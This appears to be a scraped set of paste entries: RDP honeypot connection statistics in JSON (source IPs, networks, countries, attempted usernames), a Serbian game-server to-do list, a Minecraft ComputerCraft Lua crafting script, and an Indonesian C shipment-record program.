    ""Google LLC"": 36,
    ""S.I Group"": 6,
    ""Hainan Network of ChinaTelecom"": 6,
    ""FTECH"": 3,
    ""Censys, Inc."": 6,
    ""Cyberzone S.A."": 3,
    ""Xhost Internet Solutions LP"": 12,
    ""Akamai Technologies, Inc."": 6,
    ""OVH SAS"": 3,
    ""SS-Net"": 9,
    ""SK Broadband Co Ltd"": 6,
    ""Horizon LLC"": 12,
    ""Input Output Flood LLC"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""France Telecom Orange"": 3,
    ""Ipxo Limited"": 3,
    ""Entel Chile S.A."": 3,
    ""Internet Solutions & Innovations LTD."": 3
  },
  ""org"": {
    ""Verizon Business"": 45,
    ""Unknown"": 27,
    ""Chinanet JS"": 18,
    ""UAB Host Baltic"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 6,
    ""Cyberzone SA"": 3,
    ""Xhost Internet Solutions"": 6,
    ""Linode, LLC"": 3,
    ""Flyservers S.A"": 18,
    ""OVH GmbH"": 3,
    ""Xhostis"": 6,
    ""4Media Ltd"": 9,
    ""SK Broadband Co Ltd"": 6,
    ""Horizon LLC"": 12,
    ""Linode"": 3,
    ""rdpdaddy.com"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""External"": 3,
    ""Entel PCS Telecomunicaciones S.A"": 3,
    ""Tribeka Web Advisors S.A"": 3,
    ""Cloud Solutions S.A"": 3
  },
  ""regionName"": {
    ""New Jersey"": 48,
    ""Al Asimah"": 3,
    ""Tirana"": 6,
    ""Jiangsu"": 18,
    ""Vilnius"": 12,
    ""California"": 36,
    ""Phnom Penh"": 6,
    ""Hainan"": 6,
    ""Thanh H\u00f3a Province"": 3,
    ""Hesse"": 6,
    ""England"": 3,
    ""North Holland"": 12,
    ""North West"": 3,
    ""Kaunas"": 18,
    ""Plovdiv"": 9,
    ""Ulsan"": 6,
    ""Michigan"": 3,
    ""Moscow"": 12,
    ""Arizona"": 3,
    ""Central and Western District"": 3,
    ""Normandy"": 3,
    ""New York"": 3,
    ""Santiago Metropolitan"": 3,
    ""Mariehamns stad"": 3,
    ""Distrito Federal"": 3
  },
  ""country"": {
    ""United States"": 93,
    ""Kuwait"": 3,
    ""Albania"": 6,
    ""China"": 24,
    ""Lithuania"": 30,
    ""Cambodia"": 6,
    ""Vietnam"": 3,
    ""Germany"": 6,
    ""United Kingdom"": 3,
    ""The Netherlands"": 12,
    ""Singapore"": 3,
    ""Bulgaria"": 9,
    ""South Korea"": 6,
    ""Russia"": 12,
    ""Hong Kong"": 3,
    ""France"": 3,
    ""Chile"": 3,
    ""Aland Islands"": 3,
    ""Venezuela"": 3
  },
  ""account"": {
    ""142.93.8.59"": 63,
    ""(empty)"": 21,
    ""hello"": 42,
    ""Test"": 21,
    ""GEPaHugtT"": 3,
    ""jsdANa"": 3,
    ""IFmlUM"": 3,
    ""Administr"": 18,
    ""Domain"": 21,
    ""gHwBNOLfb"": 3,
    ""WLHfFe"": 3,
    ""etPgvv"": 3,
    ""Administrator"": 3,
    ""admin"": 3,
    ""a"": 3,
    ""GTZCusInl"": 3,
    ""kBbaWx"": 3,
    ""hXFqjP"": 3,
    ""GVSAXzurG"": 3,
    ""OQBahw"": 3,
    ""WMHGyk"": 3
  },
  ""keyboard"": {
    ""Unknown"": 231
  },
  ""client_build"": {
    ""Unknown"": 231
  },
  ""client_name"": {
    ""Unknown"": 231
  },
  ""ip_type"": {
    ""Unknown"": 138,
    ""mobile"": 9,
    ""proxy"": 30,
    ""hosting"": 51,
    ""mobile & proxy"": 3
  }
}"
kuazvtHE,2024-01-01_stats.json,rdp_snitch,JSON,Monday 1st of January 2024 06:16:13 PM CDT,"{
  ""ip"": {
    ""74.105.22.130"": 30,
    ""37.34.253.225"": 2,
    ""109.69.7.157"": 4,
    ""58.218.204.183"": 12,
    ""45.227.254.49"": 4,
    ""205.210.31.203"": 6,
    ""96.9.81.231"": 4,
    ""124.225.77.47"": 4,
    ""103.47.194.238"": 2,
    ""167.94.146.59"": 2,
    ""193.30.255.95"": 2,
    ""87.251.75.145"": 4,
    ""139.162.39.215"": 2,
    ""194.165.17.21"": 8,
    ""135.125.216.200"": 2,
    ""185.170.144.3"": 4,
    ""212.70.149.146"": 6,
    ""205.210.31.234"": 6,
    ""116.125.140.72"": 4,
    ""167.248.133.34"": 2,
    ""62.204.41.208"": 8,
    ""194.165.16.11"": 4,
    ""198.74.56.135"": 2,
    ""107.189.160.91"": 2,
    ""101.36.106.136"": 2,
    ""80.15.71.53"": 2,
    ""45.130.83.36"": 2,
    ""181.42.150.114"": 2,
    ""205.210.31.39"": 6,
    ""185.190.24.101"": 2,
    ""45.227.254.26"": 4,
    ""198.235.24.206"": 6,
    ""179.60.147.51"": 2
  },
  ""asn"": {
    ""AS701"": 30,
    ""AS42961"": 2,
    ""AS21183"": 4,
    ""AS4134"": 16,
    ""AS267784"": 8,
    ""AS396982"": 24,
    ""AS131207"": 4,
    ""AS140832"": 2,
    ""AS398705"": 2,
    ""AS209854"": 2,
    ""AS208091"": 4,
    ""AS63949"": 4,
    ""AS48721"": 12,
    ""AS16276"": 2,
    ""AS197414"": 4,
    ""AS204428"": 6,
    ""AS9318"": 4,
    ""AS398324"": 2,
    ""AS59425"": 8,
    ""AS53755"": 2,
    ""AS135377"": 2,
    ""AS3215"": 2,
    ""AS206092"": 2,
    ""AS27651"": 2,
    ""AS211632"": 2,
    ""AS209588"": 2
  },
  ""isp"": {
    ""Verizon Business"": 30,
    ""ZAIN KW"": 2,
    ""Vodafone Network"": 4,
    ""Chinanet"": 12,
    ""Flyservers S.A."": 22,
    ""Google LLC"": 24,
    ""S.I Group"": 4,
    ""Hainan Network of ChinaTelecom"": 4,
    ""FTECH"": 2,
    ""Censys, Inc."": 4,
    ""Cyberzone S.A."": 2,
    ""Xhost Internet Solutions LP"": 8,
    ""Akamai Technologies, Inc."": 4,
    ""OVH SAS"": 2,
    ""SS-Net"": 6,
    ""SK Broadband Co Ltd"": 4,
    ""Horizon LLC"": 8,
    ""Input Output Flood LLC"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""France Telecom Orange"": 2,
    ""Ipxo Limited"": 2,
    ""Entel Chile S.A."": 2,
    ""Internet Solutions & Innovations LTD."": 2
  },
  ""org"": {
    ""Verizon Business"": 30,
    ""Unknown"": 18,
    ""Chinanet JS"": 12,
    ""UAB Host Baltic"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 4,
    ""Cyberzone SA"": 2,
    ""Xhost Internet Solutions"": 4,
    ""Linode, LLC"": 2,
    ""Flyservers S.A"": 12,
    ""OVH GmbH"": 2,
    ""Xhostis"": 4,
    ""4Media Ltd"": 6,
    ""SK Broadband Co Ltd"": 4,
    ""Horizon LLC"": 8,
    ""Linode"": 2,
    ""rdpdaddy.com"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""External"": 2,
    ""Entel PCS Telecomunicaciones S.A"": 2,
    ""Tribeka Web Advisors S.A"": 2,
    ""Cloud Solutions S.A"": 2
  },
  ""regionName"": {
    ""New Jersey"": 32,
    ""Al Asimah"": 2,
    ""Tirana"": 4,
    ""Jiangsu"": 12,
    ""Vilnius"": 8,
    ""California"": 24,
    ""Phnom Penh"": 4,
    ""Hainan"": 4,
    ""Thanh H\u00f3a Province"": 2,
    ""Hesse"": 4,
    ""England"": 2,
    ""North Holland"": 8,
    ""North West"": 2,
    ""Kaunas"": 12,
    ""Plovdiv"": 6,
    ""Ulsan"": 4,
    ""Michigan"": 2,
    ""Moscow"": 8,
    ""Arizona"": 2,
    ""Central and Western District"": 2,
    ""Normandy"": 2,
    ""New York"": 2,
    ""Santiago Metropolitan"": 2,
    ""Mariehamns stad"": 2,
    ""Distrito Federal"": 2
  },
  ""country"": {
    ""United States"": 62,
    ""Kuwait"": 2,
    ""Albania"": 4,
    ""China"": 16,
    ""Lithuania"": 20,
    ""Cambodia"": 4,
    ""Vietnam"": 2,
    ""Germany"": 4,
    ""United Kingdom"": 2,
    ""The Netherlands"": 8,
    ""Singapore"": 2,
    ""Bulgaria"": 6,
    ""South Korea"": 4,
    ""Russia"": 8,
    ""Hong Kong"": 2,
    ""France"": 2,
    ""Chile"": 2,
    ""Aland Islands"": 2,
    ""Venezuela"": 2
  },
  ""account"": {
    ""142.93.8.59"": 42,
    ""(empty)"": 14,
    ""hello"": 28,
    ""Test"": 14,
    ""GEPaHugtT"": 2,
    ""jsdANa"": 2,
    ""IFmlUM"": 2,
    ""Administr"": 12,
    ""Domain"": 14,
    ""gHwBNOLfb"": 2,
    ""WLHfFe"": 2,
    ""etPgvv"": 2,
    ""Administrator"": 2,
    ""admin"": 2,
    ""a"": 2,
    ""GTZCusInl"": 2,
    ""kBbaWx"": 2,
    ""hXFqjP"": 2,
    ""GVSAXzurG"": 2,
    ""OQBahw"": 2,
    ""WMHGyk"": 2
  },
  ""keyboard"": {
    ""Unknown"": 154
  },
  ""client_build"": {
    ""Unknown"": 154
  },
  ""client_name"": {
    ""Unknown"": 154
  },
  ""ip_type"": {
    ""Unknown"": 92,
    ""mobile"": 6,
    ""proxy"": 20,
    ""hosting"": 34,
    ""mobile & proxy"": 2
  }
}"
xLmrPcQu,2024-01-01_stats.json,rdp_snitch,JSON,Monday 1st of January 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""74.105.22.130"": 15,
    ""37.34.253.225"": 1,
    ""109.69.7.157"": 2,
    ""58.218.204.183"": 6,
    ""45.227.254.49"": 2,
    ""205.210.31.203"": 3,
    ""96.9.81.231"": 2,
    ""124.225.77.47"": 2,
    ""103.47.194.238"": 1,
    ""167.94.146.59"": 1,
    ""193.30.255.95"": 1,
    ""87.251.75.145"": 2,
    ""139.162.39.215"": 1,
    ""194.165.17.21"": 4,
    ""135.125.216.200"": 1,
    ""185.170.144.3"": 2,
    ""212.70.149.146"": 3,
    ""205.210.31.234"": 3,
    ""116.125.140.72"": 2,
    ""167.248.133.34"": 1,
    ""62.204.41.208"": 4,
    ""194.165.16.11"": 2,
    ""198.74.56.135"": 1,
    ""107.189.160.91"": 1,
    ""101.36.106.136"": 1,
    ""80.15.71.53"": 1,
    ""45.130.83.36"": 1,
    ""181.42.150.114"": 1,
    ""205.210.31.39"": 3,
    ""185.190.24.101"": 1,
    ""45.227.254.26"": 2,
    ""198.235.24.206"": 3,
    ""179.60.147.51"": 1
  },
  ""asn"": {
    ""AS701"": 15,
    ""AS42961"": 1,
    ""AS21183"": 2,
    ""AS4134"": 8,
    ""AS267784"": 4,
    ""AS396982"": 12,
    ""AS131207"": 2,
    ""AS140832"": 1,
    ""AS398705"": 1,
    ""AS209854"": 1,
    ""AS208091"": 2,
    ""AS63949"": 2,
    ""AS48721"": 6,
    ""AS16276"": 1,
    ""AS197414"": 2,
    ""AS204428"": 3,
    ""AS9318"": 2,
    ""AS398324"": 1,
    ""AS59425"": 4,
    ""AS53755"": 1,
    ""AS135377"": 1,
    ""AS3215"": 1,
    ""AS206092"": 1,
    ""AS27651"": 1,
    ""AS211632"": 1,
    ""AS209588"": 1
  },
  ""isp"": {
    ""Verizon Business"": 15,
    ""ZAIN KW"": 1,
    ""Vodafone Network"": 2,
    ""Chinanet"": 6,
    ""Flyservers S.A."": 11,
    ""Google LLC"": 12,
    ""S.I Group"": 2,
    ""Hainan Network of ChinaTelecom"": 2,
    ""FTECH"": 1,
    ""Censys, Inc."": 2,
    ""Cyberzone S.A."": 1,
    ""Xhost Internet Solutions LP"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""OVH SAS"": 1,
    ""SS-Net"": 3,
    ""SK Broadband Co Ltd"": 2,
    ""Horizon LLC"": 4,
    ""Input Output Flood LLC"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""France Telecom Orange"": 1,
    ""Ipxo Limited"": 1,
    ""Entel Chile S.A."": 1,
    ""Internet Solutions & Innovations LTD."": 1
  },
  ""org"": {
    ""Verizon Business"": 15,
    ""Unknown"": 9,
    ""Chinanet JS"": 6,
    ""UAB Host Baltic"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 2,
    ""Cyberzone SA"": 1,
    ""Xhost Internet Solutions"": 2,
    ""Linode, LLC"": 1,
    ""Flyservers S.A"": 6,
    ""OVH GmbH"": 1,
    ""Xhostis"": 2,
    ""4Media Ltd"": 3,
    ""SK Broadband Co Ltd"": 2,
    ""Horizon LLC"": 4,
    ""Linode"": 1,
    ""rdpdaddy.com"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""External"": 1,
    ""Entel PCS Telecomunicaciones S.A"": 1,
    ""Tribeka Web Advisors S.A"": 1,
    ""Cloud Solutions S.A"": 1
  },
  ""regionName"": {
    ""New Jersey"": 16,
    ""Al Asimah"": 1,
    ""Tirana"": 2,
    ""Jiangsu"": 6,
    ""Vilnius"": 4,
    ""California"": 12,
    ""Phnom Penh"": 2,
    ""Hainan"": 2,
    ""Thanh H\u00f3a Province"": 1,
    ""Hesse"": 2,
    ""England"": 1,
    ""North Holland"": 4,
    ""North West"": 1,
    ""Kaunas"": 6,
    ""Plovdiv"": 3,
    ""Ulsan"": 2,
    ""Michigan"": 1,
    ""Moscow"": 4,
    ""Arizona"": 1,
    ""Central and Western District"": 1,
    ""Normandy"": 1,
    ""New York"": 1,
    ""Santiago Metropolitan"": 1,
    ""Mariehamns stad"": 1,
    ""Distrito Federal"": 1
  },
  ""country"": {
    ""United States"": 31,
    ""Kuwait"": 1,
    ""Albania"": 2,
    ""China"": 8,
    ""Lithuania"": 10,
    ""Cambodia"": 2,
    ""Vietnam"": 1,
    ""Germany"": 2,
    ""United Kingdom"": 1,
    ""The Netherlands"": 4,
    ""Singapore"": 1,
    ""Bulgaria"": 3,
    ""South Korea"": 2,
    ""Russia"": 4,
    ""Hong Kong"": 1,
    ""France"": 1,
    ""Chile"": 1,
    ""Aland Islands"": 1,
    ""Venezuela"": 1
  },
  ""account"": {
    ""142.93.8.59"": 21,
    ""(empty)"": 7,
    ""hello"": 14,
    ""Test"": 7,
    ""GEPaHugtT"": 1,
    ""jsdANa"": 1,
    ""IFmlUM"": 1,
    ""Administr"": 6,
    ""Domain"": 7,
    ""gHwBNOLfb"": 1,
    ""WLHfFe"": 1,
    ""etPgvv"": 1,
    ""Administrator"": 1,
    ""admin"": 1,
    ""a"": 1,
    ""GTZCusInl"": 1,
    ""kBbaWx"": 1,
    ""hXFqjP"": 1,
    ""GVSAXzurG"": 1,
    ""OQBahw"": 1,
    ""WMHGyk"": 1
  },
  ""keyboard"": {
    ""Unknown"": 77
  },
  ""client_build"": {
    ""Unknown"": 77
  },
  ""client_name"": {
    ""Unknown"": 77
  },
  ""ip_type"": {
    ""Unknown"": 46,
    ""mobile"": 3,
    ""proxy"": 10,
    ""hosting"": 17,
    ""mobile & proxy"": 1
  }
}"
sWmhP9qf,EG Lista,Dagllas,Perl,Monday 1st of January 2024 06:12:44 PM CDT,"// Elitez Gaming //

1. Odradjen edit moda u full.. 		                                            [100%] - Djeno
2. Dodati Elitezove mape.. 	                                                    [1%] - Djeno
3. Vratiti stare TD-OVE i povezati sve lepo.                                    [100%] - Djeno
4. Srediti editplayer, i sve sto je vezano za njega..                           [100%] - Djeno
5. Dodati nove poslove u factions i dodati isto za njih lepe mape..             [0%] - Djeno
6. Dodata CMD:CHANGENAME kao rezervna opcija.                                   [OTKAZANO]
7. Dodati /avozilo u Dialog na dnu dialoga Insert ID za unikatno vozilo.		[100%] - Dagllas
8. Dodati jos jedan Admin level.                                    			[100%] - Dagllas
9. Izbaciti nepotrebne komande sa /ah.                                    		[100%] - Dagllas
10. Fixati boju TDova kada se igrac registruje.                                 [100%] - Dagllas
11. Ubaciti Mapu Spawna.                                    					[100%] - Djeno
12. Ubaciti Sokolovicevu kucu.                              					[100%] - Dagllas
13. Promjeniti povratne poruke primjer [INFO]: i slicne.                        [100%] - Dagllas
14. Ubaciti nove TDove.									                        [100%] - Dagllas
15. Promjeniti /cc.                                    							[100%] - Dagllas
16. Ubaciti Mapu Audi Auto Salona.                             					[100%] - Dagllas
17. Srediti cmd:chatcolors da samo vlasnik moze da upravlja tom komandom.		[100%] - Dagllas
18. Promeniti spawn vozila nakon kupovine u auto salonu znaci izmena kordinata.	[100%] - Dagllas
19. Izbaciti na vozilu onaj label gepek 'n' udji na server ako ne znas o cemu
	pricam i portaj svoja kola.													[100%] - Dagllas
20. U maps folder naci vw znak i promeniti ono kod vw znaka 2022 u 2016.		[100%] - Dagllas
21. Promjeniti boju Matematike, /adutya											[100%] - Dagllas
22. Fixati TD Timer.															[100%] - Dagllas
23. Izbaciti Generalovu Kucu.													[100%] - Dagllas
24. Ubaciti Sendekoviceve TDove za Interface 3.									[OTKAZANO]
25. Ubaciti Sokoloviceve TDove za Interface 2.									[100%] - Dagllas
26. Ubaciti Abstractove TDove za Interface 1.									[100%] - Dagllas
27. Dodati posao Pcelar.														[100%] - Dagllas
27. Srediti boje na /stats.														[100%] - Dagllas
28. Dodati AutoFix vozila sa NW.												[100%] - Dagllas
29. Dodati novu mapu LSPD-a.                                                    [100%] - Dagllas
30. Dodati Animated Text TD.                                                    [100%] - Dagllas
31. Dodati listu ACT na /serverpanel.                                           [100%] - Dagllas
32. Odraditi GM CMD i dodatu dozvole za koriscenje istih.                       [100%] - Dagllas
33. Promjeniti boju Labela i Duty za Admine i CMD za /gmduty.                   [100%] - Dagllas
34. Fixati update skina kad se postavi /setskin.                                [100%] - Dagllas
35. Fixati Ime Stafforda(vozila) zove se Elitez Gaming.                         [100%] - Dagllas
36. Fixati Vehicle Object na Brzinomjeru.                                  		[100%] - Dagllas"
z81bzGqq,fluix maker,aregrubb,Lua,Monday 1st of January 2024 06:00:33 PM CDT,"function refuel() -- standard script for refuel
        if turtle.getFuelLevel() ~= ""unlimited"" and turtle.getFuelLevel() < 1 then
                    repeat
                            turtle.select(1)
                            if turtle.getItemCount( turtle.getSelectedSlot() ) == 0 then
								redstone.setAnalogOutput(""top"",15)
                                print(""Out of fuel! Put fuel in first slot."")
                                print(""Press any key to continue"")
								os.pullEvent(""key"")
								redstone.setAnalogOutput(""top"",0)
                            else
                            end
                    until turtle.getItemCount( turtle.getSelectedSlot() ) > 0
                    print(""refueling"")
                    turtle.refuel()         
        end
end

while true do -- start the endless journey
	refuel()
	
	turtle.select(2) -- select inventory slot number 2
	local slot2raw = turtle.getItemDetail() -- store the item details for item in slot 2
	turtle.select(3)
	local slot3raw = turtle.getItemDetail()
	turtle.select(4)
	local slot4raw = turtle.getItemDetail()
	
	if 	slot2raw and slot3raw and slot4raw then
		local slot2 = tostring(slot2raw.name)
		local slot3 = tostring(slot3raw.name)
		local slot4 = tostring(slot4raw.name)
	-- script for recognizing right inventory for fluix crystal
		if slot2 == ""ae2:charged_certus_quartz_crystal"" or slot2 == ""minecraft:redstone"" or slot2 == ""minecraft:quartz""
		and slot3 == ""ae2:charged_certus_quartz_crystal"" or slot3 == ""minecraft:redstone"" or slot3 == ""minecraft:quartz"" 
		and slot4 == ""ae2:charged_certus_quartz_crystal"" or slot4 == ""minecraft:redstone"" or slot4 == ""minecraft:quartz"" 
		then
		-- make fluix crystal
			turtle.forward()
			for a = 2,4,1 do
				turtle.select(a)
				turtle.dropDown()
			end
			os.sleep(10)
			turtle.select(3)
			itemcunt3 = turtle.getItemCount()
			turtle.select(2)
			itemcunt2 = turtle.getItemCount()
			while itemcunt2 < 64 and itemcunt3 < 64 do
				turtle.suckDown()
				turtle.select(3)
				itemcunt3 = turtle.getItemCount()
				turtle.select(2)
				itemcunt2 = turtle.getItemCount()
			end
			turtle.back()
			turtle.turnLeft() turtle.turnLeft()
			for a = 2,4,1 do
				turtle.select(a)
				turtle.drop()
			end
			turtle.turnLeft() turtle.turnLeft()
		end
	end
	os.sleep(0.2)
end

"
B2TWPqYr,Untitled,berasmerah,C++,Monday 1st of January 2024 05:59:51 PM CDT,"#include <stdio.h>
#include <string.h>

struct dataPengiriman {
    char nama[100];
    int jumlah;
    int tanggal;
    char bulan[100];
};

void writeToFile(struct dataPengiriman produk[], int range, const char *filename) {
    FILE *file = fopen(filename, ""w"");

    if (file == NULL) {
        printf(""Error opening file.\n"");
        return;
    }

    for (int i = 0; i < range; i++) {
        fprintf(file, ""%s %d %d %s\n"", produk[i].nama, produk[i].jumlah, produk[i].tanggal, produk[i].bulan);
    }

    fclose(file);
}


void syncData(FILE *file, dataPengiriman produk[], int *range) {
    int dataSynced = fscanf(file, ""%s %d %d %s"", produk[*range].nama, &produk[*range].jumlah, &produk[*range].tanggal, produk[*range].bulan);
    
    if(dataSynced == 4){
        (*range)++;
        syncData(file, produk, range);
    }
}

void readFromFile(struct dataPengiriman produk[], int *range, const char *filename) {
    FILE *file = fopen(filename, ""r"");

    if (file == NULL) {
        printf(""Error opening file.\n"");
        return;
    }

    *range = 0;

    syncData(file, produk, range);

    fclose(file);
}

void deleteData(struct dataPengiriman produk[], int *range, const char *namaToDelete) {
    int i, j;
    for (i = 0; i < *range; i++) {
        if (strcmp(produk[i].nama, namaToDelete) == 0) {
            // Jika nama barang cocok, geser semua data setelahnya ke atas
            for (j = i; j < *range - 1; j++) {
                strcpy(produk[j].nama, produk[j + 1].nama);
                produk[j].jumlah = produk[j + 1].jumlah;
                produk[j].tanggal = produk[j + 1].tanggal;
                strcpy(produk[j].bulan, produk[j + 1].bulan);
            }
            (*range)--;
            i--;  // Periksa lagi data yang bergeser ke posisi i
        }
    }
}

void daftarBarang() {
    printf(""==============================\n"");
    printf(""\t MENU PENGIRIMAN \t\n"");
    printf(""==============================\n"");
    printf(""1. Masukkan identitas barang\n"");
    printf(""2. Data pengiriman\n"");
    printf(""3. Searching Data\n"");
    printf(""4. Mengurutkan data\n"");
    printf(""5. Hapus data\n"");
    printf(""6. Keluar\n"");
}

void input_data(struct dataPengiriman produk[], int *range) {
    printf(""===================================\n"");
    printf(""\t Masukkan identitas barang \t\n"");
    printf(""===================================\n"");
    if (*range < 10000) {
        printf(""Masukkan Nama barang : "");
        scanf(""%s"", produk[*range].nama);
        printf(""Masukkan jumlah produk : "");
        scanf(""%d"", &produk[*range].jumlah);
        printf(""Masukkan tanggal pengiriman : "");
        scanf(""%d"", &produk[*range].tanggal);
        printf(""Masukkan bulan pengiriman : "");
        scanf(""%s"", produk[*range].bulan);
        (*range)++;
    } else {
        printf(""Jumlah produk sudah mencapai batas maksimum.\n"");
    }
}

void data(struct dataPengiriman produk[], int range) {
    printf(""===================================\n"");
    printf(""\t Data Pengiriman \t\n"");
    printf(""===================================\n"");
    for (int i = 0; i < range; i++) {
        printf(""%s : %d, pengiriman pada tanggal %d bulan %s\n"", produk[i].nama, produk[i].jumlah, produk[i].tanggal, produk[i].bulan);
    }
}

void cariProduk(struct dataPengiriman produk[], int range) {
    char barangDicari[100];
    printf(""Masukkan Nama Produk yang Dicari : "");
    scanf(""%s"", barangDicari);

    int found = 0;
    for (int i = 0; i < range; i++) {
        if (strcmp(produk[i].nama, barangDicari) == 0) {
            printf(""\nProduk ditemukan:\n"");
            printf(""%s : %d, pengiriman pada tanggal %d bulan %s\n"", produk[i].nama, produk[i].jumlah, produk[i].tanggal, produk[i].bulan);
            found = 1;
            break;  // Hentikan pencarian setelah produk ditemukan
        }
    }

    if (!found) {
        printf(""\nProduk tidak ditemukan\n"");
    }
}

void PengirimanPerBulan(struct dataPengiriman produk[], int range) {
    // Mengurutkan pengiriman per bulan secara descending
    for (int i = 0; i < range - 1; i++) {
        for (int j = 0; j < range - i - 1; j++) {
            if (produk[j].jumlah < produk[j + 1].jumlah) {
                // Tukar nilai total dan bulan
                int tempJumlah = produk[j].jumlah;
                produk[j].jumlah = produk[j + 1].jumlah;
                produk[j + 1].jumlah = tempJumlah;

                // Tukar nama bulan
                char tempBulan[100];
                strcpy(tempBulan, produk[j].bulan);
                strcpy(produk[j].bulan, produk[j + 1].bulan);
                strcpy(produk[j + 1].bulan, tempBulan);
            }
        }
    }

    // Menampilkan pengurutan pengiriman per bulan
    printf(""\nPengurutan Pengiriman per Bulan (descending):\n"");
    for (int i = 0; i < range; i++) {
        printf(""Bulan %s: %d\n"", produk[i].bulan, produk[i].jumlah);
    }
}

int main() {
    struct dataPengiriman produk[10000];
    int range = 0;
    int pilih;

    // Membaca data dari file saat program dimulai
    readFromFile(produk, &range, ""data_pengiriman.txt"");

    do {
        daftarBarang();
        printf(""Pilih Menu pengiriman (1-6): "");
        scanf(""%d"", &pilih);

        switch (pilih) {
            case 1:
                input_data(produk, &range);
                break;
            case 2:
                data(produk, range);
                break;
            case 3:
                cariProduk(produk, range);
                break;
            case 4:
                PengirimanPerBulan(produk, range);
                printf(""\nData Produk :\n"");
                data(produk, range);
                break;
            case 5:
                // Hapus data berdasarkan nama barang
                {
                    char namaBarangHapus[100];
                    printf(""Masukkan Nama Produk yang Akan Dihapus: "");
                    scanf(""%s"", namaBarangHapus);
                    deleteData(produk, &range, namaBarangHapus);
                    // Menyimpan data setelah dihapus ke dalam file
                    writeToFile(produk, range, ""data_pengiriman.txt"");
                    printf(""Data berhasil dihapus.\n"");
                }
                break;
            case 6:
                // Menyimpan data ke file sebelum keluar
                writeToFile(produk, range, ""data_pengiriman.txt"");
                printf(""Program selesai.\n"");
                break;
            default:
                printf(""Pilihan tidak valid.\n"");
        }

    } while (pilih != 6);

    return 0;
}
"
